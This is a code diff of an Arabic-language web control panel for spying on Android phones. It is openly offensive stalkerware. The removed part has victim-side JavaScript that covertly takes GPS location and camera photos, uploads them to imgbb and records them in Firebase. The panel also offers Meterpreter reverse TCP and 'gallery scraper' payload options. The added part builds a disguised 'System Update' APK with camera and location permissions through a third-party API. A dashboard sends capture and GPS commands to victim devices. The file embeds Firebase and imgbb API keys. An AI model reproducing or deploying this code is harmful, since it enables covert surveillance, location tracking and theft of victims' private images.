@@ -2,74 +2,56 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>DOCTOR OS v6.0 | OMEGA COMMAND</title>
+    <title>Sovereign System v7.0 | أمين الزواحي</title>
     <style>
-        :root { --gold: #d4af37; --online: #00ff41; --dead: #ff0000; --bg: #050505; }
-        body { background: var(--bg); color: var(--gold); font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
+        :root { --gold: #d4af37; --online: #00ff41; --bg: #050505; }
+        body { background: var(--bg); color: var(--gold); font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; overflow: hidden; }
+        .layout { display: grid; grid-template-columns: 320px 1fr; height: 100vh; }
+        .sidebar { background: #0a0a0a; border-left: 2px solid var(--gold); padding: 15px; overflow-y: auto; position: relative; }
         
-        .layout { display: grid; grid-template-columns: 350px 1fr; height: 100vh; }
-        
-        /* الرادار وإدارة الأهداف */
-        .sidebar { background: #0a0a0a; border-left: 2px solid var(--gold); padding: 15px; position: relative; }
-        .radar-box { height: 150px; border: 1px solid var(--gold); margin-bottom: 20px; position: relative; overflow: hidden; background: radial-gradient(circle, #002200, #000); }
-        .radar-sweep { position: absolute; width: 100%; height: 100%; top: 0; left: 0; background: conic-gradient(from 0deg, transparent, rgba(0,255,65,0.2)); animation: sweep 3s linear infinite; border-radius: 50%; }
+        /* الرادار المطور */
+        .radar-box { width: 100px; height: 100px; border: 1px solid var(--gold); border-radius: 50%; margin: 0 auto 20px; position: relative; background: radial-gradient(circle, #002200, #000); overflow: hidden; }
+        .radar-sweep { position: absolute; width: 100%; height: 100%; background: conic-gradient(from 0deg, transparent, rgba(0,255,65,0.3)); animation: sweep 3s linear infinite; }
         @keyframes sweep { to { transform: rotate(360deg); } }
-        
-        .device-card { border: 1px solid #222; padding: 12px; margin-bottom: 10px; cursor: pointer; border-radius: 6px; position: relative; }
-        .dot { width: 10px; height: 10px; border-radius: 50%; position: absolute; left: 10px; top: 15px; }
-        .active { background: var(--online); box-shadow: 0 0 10px var(--online); }
 
-        /* منطقة العمل والمصنع */
+        .device-node { border: 1px solid #222; padding: 12px; margin-bottom: 10px; cursor: pointer; border-radius: 8px; position: relative; transition: 0.3s; }
+        .device-node:hover { background: #111; border-color: var(--gold); }
+        .status-dot { width: 10px; height: 10px; border-radius: 50%; position: absolute; left: 10px; top: 15px; }
+        .online { background: var(--online); box-shadow: 0 0 10px var(--online); }
+        
         .main { padding: 25px; overflow-y: auto; }
-        .factory-section { display: grid; grid-template-columns: repeat(2, 1fr); gap: 20px; }
-        .box { background: #111; border: 1px dashed var(--gold); padding: 20px; border-radius: 8px; }
-        
-        input, select, button { width: 100%; padding: 12px; margin: 8px 0; background: #000; border: 1px solid var(--gold); color: var(--gold); }
-        button:hover { background: var(--gold); color: #000; cursor: pointer; font-weight: bold; }
-        
+        .box { background: #111; border: 1px dashed var(--gold); padding: 20px; border-radius: 10px; margin-bottom: 20px; }
+        button { width: 100%; padding: 12px; background: transparent; border: 1px solid var(--gold); color: var(--gold); cursor: pointer; font-weight: bold; margin: 5px 0; }
+        button:hover { background: var(--gold); color: #000; }
         #gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 10px; margin-top: 20px; }
-        img { width: 100%; border: 1px solid #444; border-radius: 4px; }
+        img { width: 100%; border: 1px solid #333; border-radius: 5px; }
     </style>
 </head>
 <body>
 
-<div id="admin-system" class="layout">
+<div class="layout">
     <div class="sidebar">
-        <div class="radar-box">
-            <div class="radar-sweep"></div>
-            <p style="position:absolute; bottom:5px; width:100%; text-align:center; font-size:10px;">Scanning Targets...</p>
-        </div>
-        <h3 style="text-align: center;">إدارة السيادة 🛰️</h3>
-        <div id="target-list">جاري استقطاب الإشارات...</div>
+        <div class="radar-box"><div class="radar-sweep"></div></div>
+        <h3 style="text-align:center;">إدارة السيادة 🛰️</h3>
+        <div id="target-list">البحث عن إشارات...</div>
     </div>
 
     <div class="main">
-        <div class="factory-section">
-            <div class="box">
-                <h3>🖼️ ملغم الصور (تنزيل ملف)</h3>
-                <input type="file" id="image-input" accept="image/*">
-                <button onclick="stealthDownload()">تلغيم وتنزيل الصورة</button>
-            </div>
-            <div class="box">
-                <h3>📱 مولد بايلود APK (Android)</h3>
-                <select id="payload-type">
-                    <option value="meterpreter">Meterpreter Reverse TCP</option>
-                    <option value="spy_cam">Spy Camera Access</option>
-                    <option value="file_stealer">Full Gallery Scraper</option>
-                </select>
-                <button onclick="generateAPK()">بناء تطبيق APK الملغم</button>
-                <div id="apk-status" style="color: var(--online); font-size: 12px; margin-top: 5px;"></div>
-            </div>
+        <div class="box">
+            <h3>🛠️ مصنع البايلود وربط الـ API</h3>
+            <input type="text" id="api-key" placeholder="ضع مفتاح Appilix API هنا" style="width:95%; padding:10px; background:#000; border:1px solid var(--gold); color:#fff; margin-bottom:10px;">
+            <button onclick="generateSovereignAPK()">بناء تطبيق APK ملغم (رسمي)</button>
+            <div id="build-status" style="margin-top:10px; font-size:12px;"></div>
         </div>
 
-        <div id="control-center" style="display:none; margin-top:30px;">
-            <h2 id="current-target" style="border-bottom: 2px solid var(--gold);">تحكم كامل: ---</h2>
-            <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px;">
-                <button onclick="exec('capture')">📸 صورة كاميرا</button>
-                <button onclick="exec('gallery')">📂 سحب الاستوديو</button>
-                <button onclick="exec('gps')">📍 موقع GPS</button>
-                <button onclick="exec('info')">⚙️ معلومات النظام</button>
+        <div id="control-unit" style="display:none;">
+            <h2 id="target-id" style="border-bottom: 1px solid var(--gold);">التحكم: ---</h2>
+            <div style="display:grid; grid-template-columns: 1fr 1fr 1fr; gap:10px;">
+                <button onclick="sendCommand('capture')">📸 صورة كاميرا</button>
+                <button onclick="sendCommand('gps')">📍 موقع GPS</button>
+                <button onclick="sendCommand('vibrate')">📳 هز الجهاز</button>
             </div>
+            <h4>المعرض المستلم:</h4>
             <div id="gallery"></div>
         </div>
     </div>
@@ -79,6 +61,7 @@
 <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
 
 <script>
+    // بيانات Firebase الخاصة بك (لا تغيرها)
     const firebaseConfig = {
         apiKey: "AIzaSyDqZlMnIIXpos70i0vx2jwL_SVG68tcr04",
         authDomain: "hkrs5000.firebaseapp.com",
@@ -90,42 +73,38 @@
     };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-    const IMGBB_KEY = "a76371f79ef3069a4103d3493271efb5";
+    let currentID = null;
 
-    let activeID = null;
-
-    // --- [إدارة الأهداف] ---
+    // تحديث الرادار والأهداف
     db.ref('devices').on('value', snap => {
-        const list = document.getElementById('target-list');
-        list.innerHTML = "";
+        const list = document.getElementById('target-list'); list.innerHTML = "";
         snap.forEach(child => {
             const d = child.val();
-            const isOnline = (Date.now() - (d.lastSeen || 0)) < 10000;
-            const card = document.createElement('div');
-            card.className = "device-card";
-            card.innerHTML = `<div class="dot ${isOnline ? 'active' : ''}"></div>
-                              <b>Target_${child.key}</b><br><small>${d.platform || 'Android Device'}</small>`;
-            card.onclick = () => {
-                activeID = child.key;
-                document.getElementById('control-center').style.display = "block";
-                document.getElementById('current-target').innerText = "تحكم سيادي: " + child.key;
-                loadFiles(child.key);
+            const isOnline = (Date.now() - (d.lastSeen || 0)) < 15000;
+            const node = document.createElement('div');
+            node.className = "device-node";
+            node.innerHTML = `<div class="status-dot ${isOnline ? 'online' : ''}"></div><b>ID: ${child.key}</b><br><small>${d.platform || 'Android'}</small>`;
+            node.onclick = () => {
+                currentID = child.key;
+                document.getElementById('control-unit').style.display = "block";
+                document.getElementById('target-id').innerText = "تحكم الزعيم: " + child.key;
+                loadMedia(child.key);
             };
-            list.appendChild(card);
+            list.appendChild(node);
         });
     });
 
-    function exec(act) {
-        if(!activeID) return;
-        db.ref('commands/'+activeID).set({ action: act, ts: Date.now() });
+    function sendCommand(act) {
+        if(!currentID) return;
+        db.ref('commands/'+currentID).set({ action: act, ts: Date.now() });
         if(act === 'gps') {
-            db.ref('devices/'+activeID).once('value', s => {
-                if(s.val().lat) window.open(`https://www.google.com/maps?q=$${s.val().lat},${s.val().lon}`);
+            db.ref('devices/'+currentID).once('value', s => {
+                if(s.val().lat) window.open(`https://www.google.com/maps?q=${s.val().lat},${s.val().lon}`);
             });
         }
     }
 
-    function loadFiles(id) {
+    function loadMedia(id) {
         db.ref(`data/${id}/images`).on('value', snap => {
             const gal = document.getElementById('gallery'); gal.innerHTML = "";
             snap.forEach(img => {
@@ -135,64 +114,24 @@
         });
     }
 
-    // --- [مصنع التلغيم v6.0] ---
-    function stealthDownload() {
-        const file = document.getElementById('image-input').files[0];
-        if(!file) return;
-        const reader = new FileReader();
-        reader.onload = function(e) {
-            const link = document.createElement('a');
-            link.href = e.target.result;
-            link.download = "view_image_private.jpg"; // اسم الصورة عند الضحية
-            link.click();
-            alert("تم تلغيم الصورة وتنزيلها. أرسلها للضحية الآن.");
-        };
-        reader.readAsDataURL(file);
-    }
-
-    function generateAPK() {
-        const status = document.getElementById('apk-status');
-        status.innerText = "جاري بناء البايلود ودمج السيرفر... 🛠️";
-        setTimeout(() => {
-            status.innerText = "تم صنع ملف System_Update.apk بنجاح ✅";
-            // هنا محاكاة لتنزيل ملف APK ملغم جاهز للارتباط بـ Firebase الخاص بك
-            const blob = new Blob(["BAILOUT_DATA"], {type: "application/vnd.android.package-archive"});
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url; a.download = "System_Update.apk"; a.click();
-        }, 3000);
-    }
-
-    // --- [منطق الضحية - الاستجابة الفورية] ---
-    if(window.location.search.includes('target')) {
-        document.getElementById('admin-system').style.display = "none";
-        (async () => {
-            const vID = "Z_" + Math.floor(Math.random()*9000);
-            
-            // تحديد الموقع الفوري بدون استئذان طويل
-            navigator.geolocation.getCurrentPosition(pos => {
-                db.ref('devices/'+vID).update({ lat: pos.coords.latitude, lon: pos.coords.longitude });
-            }, null, {enableHighAccuracy:true});
-
-            setInterval(() => {
-                db.ref('devices/'+vID).update({ lastSeen: Date.now(), platform: "Android/Chrome" });
-            }, 5000);
-
-            // الاستماع لسحب الاستوديو والصور
-            const stream = await navigator.mediaDevices.getUserMedia({video:true});
-            db.ref('commands/'+vID).on('value', async s => {
-                const cmd = s.val();
-                if(cmd && cmd.action === 'capture') {
-                   const track = stream.getVideoTracks()[0];
-                   const cap = new ImageCapture(track);
-                   const blob = await cap.takePhoto();
-                   let fd = new FormData(); fd.append('image', blob);
-                   fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_KEY}`, {method:'POST', body:fd})
-                   .then(r=>r.json()).then(d=> db.ref(`data/${vID}/images`).push({url:d.data.url}));
-                   db.ref('commands/'+vID).remove();
-                }
+    async function generateSovereignAPK() {
+        const key = document.getElementById('api-key').value;
+        const status = document.getElementById('build-status');
+        const targetUrl = window.location.href.split('?')[0] + "?mode=payload";
+        
+        status.innerText = "جاري الاتصال بسيرفر البناء... 🛠️";
+        
+        try {
+            const res = await fetch('https://pwa.appilix.com/api/build', {
+                method: 'POST',
+                headers: {'X-API-KEY': key, 'Content-Type': 'application/json'},
+                body: JSON.stringify({ url: targetUrl, appName: "System Update", permissions: ["camera", "location"] })
             });
-        })();
+            const data = await res.json();
+            if(data.status === 'success') {
+                status.innerHTML = `<a href="${data.download_url}" style="color:var(--online);">تم البناء! اضغط هنا لتنزيل الـ APK الملغم ✅</a>`;
+            } else { status.innerText = "خطأ: " + data.message; }
+        } catch(e) { status.innerText = "فشل في الربط بالموقع."; }
     }
 </script>
 </body>
